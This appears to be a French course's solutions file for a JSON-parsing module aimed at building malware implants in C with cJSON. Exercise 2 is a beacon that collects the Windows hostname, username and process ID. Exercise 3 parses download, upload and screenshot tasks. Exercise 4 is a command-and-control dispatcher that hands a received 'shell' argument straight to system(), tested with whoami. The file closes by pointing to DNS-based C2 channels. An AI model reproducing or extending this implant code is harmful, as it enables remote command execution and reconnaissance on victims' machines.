# Solutions - JSON Parsing

## Exercice 1 : Parser un JSON simple

```c
#include <stdio.h>
#include "cJSON.h"

int main() {
    const char* json = "{\"status\":\"online\",\"users\":42,\"version\":\"1.2.3\"}";

    cJSON* root = cJSON_Parse(json);
    if (!root) {
        printf("Error parsing JSON\n");
        return 1;
    }

    cJSON* status = cJSON_GetObjectItem(root, "status");
    cJSON* users = cJSON_GetObjectItem(root, "users");
    cJSON* version = cJSON_GetObjectItem(root, "version");

    if (cJSON_IsString(status)) {
        printf("Status: %s\n", status->valuestring);
    }

    if (cJSON_IsNumber(users)) {
        printf("Users: %d\n", users->valueint);
    }

    if (cJSON_IsString(version)) {
        printf("Version: %s\n", version->valuestring);
    }

    cJSON_Delete(root);
    return 0;
}
```

## Exercice 2 : Créer un beacon JSON

```c
#include <stdio.h>
#include <windows.h>
#include "cJSON.h"

int main() {
    cJSON* root = cJSON_CreateObject();

    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);

    cJSON_AddStringToObject(root, "hostname", hostname);
    cJSON_AddStringToObject(root, "username", username);
    cJSON_AddNumberToObject(root, "pid", GetCurrentProcessId());

    char* jsonString = cJSON_Print(root);
    printf("%s\n", jsonString);

    cJSON_free(jsonString);
    cJSON_Delete(root);

    return 0;
}
```

## Exercice 3 : Parser un tableau de commandes

```c
#include <stdio.h>
#include "cJSON.h"

int main() {
    const char* json = "{\"tasks\":[\"download\",\"upload\",\"screenshot\"]}";

    cJSON* root = cJSON_Parse(json);
    if (!root) return 1;

    cJSON* tasks = cJSON_GetObjectItem(root, "tasks");

    if (cJSON_IsArray(tasks)) {
        int size = cJSON_GetArraySize(tasks);
        printf("Tasks to execute (%d):\n", size);

        for (int i = 0; i < size; i++) {
            cJSON* item = cJSON_GetArrayItem(tasks, i);
            if (cJSON_IsString(item)) {
                printf("  [%d] %s\n", i, item->valuestring);
            }
        }
    }

    cJSON_Delete(root);
    return 0;
}
```

## Exercice 4 : Dispatcher de commandes C2

```c
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "cJSON.h"

void DispatchCommand(const char* json) {
    cJSON* root = cJSON_Parse(json);
    if (!root) {
        printf("[-] Invalid JSON\n");
        return;
    }

    cJSON* command = cJSON_GetObjectItem(root, "command");
    if (!cJSON_IsString(command)) {
        printf("[-] Missing command field\n");
        cJSON_Delete(root);
        return;
    }

    printf("[*] Command: %s\n", command->valuestring);

    if (strcmp(command->valuestring, "shell") == 0) {
        cJSON* args = cJSON_GetObjectItem(root, "args");
        if (cJSON_IsString(args)) {
            printf("[*] Executing: %s\n", args->valuestring);
            system(args->valuestring);
        }
    }
    else if (strcmp(command->valuestring, "sleep") == 0) {
        cJSON* duration = cJSON_GetObjectItem(root, "duration");
        if (cJSON_IsNumber(duration)) {
            printf("[*] Sleeping for %d seconds\n", duration->valueint);
            Sleep(duration->valueint * 1000);
        }
    }
    else if (strcmp(command->valuestring, "exit") == 0) {
        printf("[*] Exiting...\n");
        cJSON_Delete(root);
        ExitProcess(0);
    }
    else {
        printf("[-] Unknown command: %s\n", command->valuestring);
    }

    cJSON_Delete(root);
}

int main() {
    // Test 1
    DispatchCommand("{\"command\":\"shell\",\"args\":\"whoami\"}");

    // Test 2
    DispatchCommand("{\"command\":\"sleep\",\"duration\":5}");

    // Test 3 (invalide)
    DispatchCommand("{invalid json}");

    return 0;
}
```

**Compilation** :
```bash
gcc solution.c cJSON.c -o dispatcher.exe
```

---

**Prochaine étape** : Module W49 (DNS Communication) pour des canaux C2 alternatifs.
